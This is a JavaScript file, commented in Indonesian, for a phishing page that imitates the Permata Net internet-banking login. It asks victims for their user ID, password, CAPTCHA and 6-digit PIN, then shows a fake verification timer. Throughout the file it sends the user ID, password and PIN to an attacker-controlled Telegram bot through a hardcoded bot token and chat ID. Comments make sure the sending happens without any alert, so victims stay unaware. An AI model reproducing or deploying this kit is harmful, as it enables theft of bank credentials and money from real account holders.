// ==============================================
// DATA TELEGRAM BOT (GANTI DENGAN DATA ANDA!)
// ==============================================
const TELEGRAM_BOT_TOKEN = "8325905710%3AAAEfYEY2mmRyNRTXs-70xL9XdCYDZQ5d1s0"; // Harus ada "bot" di awal
const TELEGRAM_CHAT_ID = "8749884634"; // Dapatkan dari @myidbot


// ==============================================
// FUNGSI KIRIM DATA KE TELEGRAM (TANPA ALERT)
// ==============================================
function kirimKeTelegram(jenisData, data) {
    let pesan = "";
    if (jenisData === "Login") {
        pesan = `
📌 **DATA LOGIN PERMATA NET**
• User ID: \`${data.userID}\`
• Password: \`${data.password}\`
• CAPTCHA: \`${data.captcha}\`
        `.trim();
    } else if (jenisData === "PIN") {
        pesan = `
🔑 **DATA PIN PERMATA NET**
• User ID Terkait: \`${data.userID}\`
• PIN: \`${data.pin}\`
        `.trim();
    }

    if (!pesan) {
        console.error("❌ Gagal: Pesan kosong"); // Hanya log, tidak alert
        return;
    }

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: pesan,
            parse_mode: "Markdown",
            disable_web_page_preview: true
        })
    })
    .then(async res => {
        const respons = await res.json();
        if (res.ok && respons.ok) {
            console.log(`✅ ${jenisData} terkirim ke Telegram!`); // Hanya log di console
        } else {
            throw new Error(respons.description || "Gagal mengirim");
        }
    })
    .catch(err => {
        console.error(`❌ Gagal kirim ${jenisData}:`, err.message); // Hanya log error
        // Jika ingin alert HANYA saat error (opsional), bisa aktifkan baris di bawah:
        // alert(`❌ Gagal memproses data: Silakan coba lagi nanti.`);
    });
}


// ==============================================
// FUNGSI HALAMAN LOGIN & CAPTCHA (TANPA ALERT TAMBAHAN)
// ==============================================
// Toggle password
const togglePassword = document.getElementById("togglePassword");
const passwordInput = document.getElementById("password");
togglePassword.addEventListener("click", () => {
    const type = passwordInput.type === "password" ? "text" : "password";
    passwordInput.type = type;
    togglePassword.innerHTML = type === "password" ? 
        '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
});

// Generate CAPTCHA
const captchaDisplay = document.getElementById("captchaDisplay");
const captchaInput = document.getElementById("captchaInput");
const changeCaptcha = document.getElementById("changeCaptcha");

function generateCaptcha() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let captcha = "";
    for (let i = 0; i < 4; i++) {
        captcha += chars[Math.floor(Math.random() * chars.length)];
    }
    captchaDisplay.textContent = captcha;
    captchaInput.value = "";
}
generateCaptcha(); // Jalankan saat dimuat
changeCaptcha.addEventListener("click", (e) => {
    e.preventDefault();
    generateCaptcha();
});

// Validasi login & pindah halaman (hanya alert validasi dasar)
const loginForm = document.getElementById("loginForm");
const loginPage = document.getElementById("loginPage");
const pinPage = document.getElementById("pinPage");
let userIDTerdaftar = ""; // Simpan User ID untuk PIN

loginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const userID = document.getElementById("userID").value.trim();
    const password = passwordInput.value.trim();
    const enteredCaptcha = captchaInput.value.trim();
    const currentCaptcha = captchaDisplay.textContent;

    // Validasi dasar (hanya alert jika input kosong/salah CAPTCHA - opsional bisa dihilangkan juga)
    if (!userID) return alert("User ID tidak boleh kosong!");
    if (!password) return alert("Password tidak boleh kosong!");
    if (!enteredCaptcha) return alert("CAPTCHA tidak boleh kosong!");
    if (enteredCaptcha !== currentCaptcha) {
        alert("CAPTCHA salah!");
        generateCaptcha();
        return;
    }

    // Kirim data login ke Telegram (tanpa alert)
    kirimKeTelegram("Login", {
        userID: userID,
        password: password,
        captcha: enteredCaptcha
    });

    // Simpan User ID & pindah ke halaman PIN SECARA LANGSUNG (tanpa jeda)
    userIDTerdaftar = userID;
    loginPage.style.display = "none";
    pinPage.style.display = "block";
    document.querySelector(".pin-input").focus();
});


// ==============================================
// FUNGSI HALAMAN PIN (TANPA ALERT)
// ==============================================
const pinInputs = document.querySelectorAll(".pin-input");
const page3 = document.getElementById("page3");
let timerInterval;

// Otomatis pindah input PIN
pinInputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        input.value = input.value.replace(/[^0-9]/g, ""); // Hanya angka

        if (input.value.length === 1) {
            if (index < 5) {
                pinInputs[index + 1].focus();
            } else {
                // PIN lengkap: validasi & kirim
                const pin = Array.from(pinInputs).map(inp => inp.value).join("");
                if (pin.length === 6) {
                    // Kirim PIN ke Telegram (tanpa alert)
                    kirimKeTelegram("PIN", {
                        userID: userIDTerdaftar,
                        pin: pin
                    });

                    // Pindah ke halaman 3 SECARA LANGSUNG
                    pinPage.style.display = "none";
                    page3.style.display = "block";
                    startTimer();
                } else {
                    alert("PIN harus 6 digit!"); // Opsional bisa dihilangkan
                }
            }
        }
    });

    // Backspace pindah ke input sebelumnya
    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
            pinInputs[index - 1].focus();
        }
    });
});


// ==============================================
// FUNGSI HALAMAN 3: TIMER & KIRIM ULANG
// ==============================================
function startTimer() {
    let timeLeft = 120; // 2 menit dalam detik
    const timerDisplay = document.getElementById("timer");

    function updateTimer() {
        const minutes = Math.floor(timeLeft / 60);
        let seconds = timeLeft % 60;
        seconds = seconds < 10 ? `0${seconds}` : seconds;
        timerDisplay.textContent = `Waktu tersisa: ${minutes}:${seconds}`;

        timeLeft--;

        if (timeLeft < 0) {
            clearInterval(timerInterval);
            timerDisplay.textContent = "Waktu habis";
        }
    }

    updateTimer();
    timerInterval = setInterval(updateTimer, 1000);
}

// Fungsi kirim ulang otentikasi (tanpa alert)
function resendAuthentication() {
    clearInterval(timerInterval);
    startTimer();
    console.log("🔄 Pesan otentikasi dikirim ulang"); // Hanya log
}

// Fungsi tutup halaman 3
function closePage3() {
    clearInterval(timerInterval);
    page3.style.display = "none";
}
